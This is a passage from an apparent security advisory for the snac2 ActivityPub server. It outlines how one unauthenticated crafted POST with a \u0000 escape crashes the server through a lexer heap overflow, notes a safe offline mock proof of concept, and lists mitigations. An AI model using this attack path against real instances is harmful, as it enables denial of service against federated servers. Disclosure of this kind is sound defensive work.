   plus hardened escape handling in the lexer */

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker sends a single crafted application/activity+json POST to activitypub_post_handler() containing the \u0000 escape. No account, no signature, nothing to forge.
  2. The lexer overflows while parsing, corrupting heap memory — and the server crashes.
  3. One request, unauthenticated, remote. Every message can be replayed at will, so the instance can be kept down indefinitely.

The accompanying poc.py demonstrates the pattern safely: a mock inbox handler whose vulnerable variant parses before verifying (flagging the crash), versus the fixed variant that verifies the signature first and hardens escape handling. Fully offline, synthetic data — no exploit, no real overflow, no network calls.

Federation stays open by design — which makes a pre-auth crash bug the worst kind to have.

docs.title: Mitigation
docs.text:
• Update to snac2 2.93 immediately.
  • If you cannot update right away, put the instance behind a reverse proxy with request size and rate limits to slow the attack.
  • Monitor for crash loops and run the process under supervision so it restarts.
  • Never parse untrusted input before authenticating it.
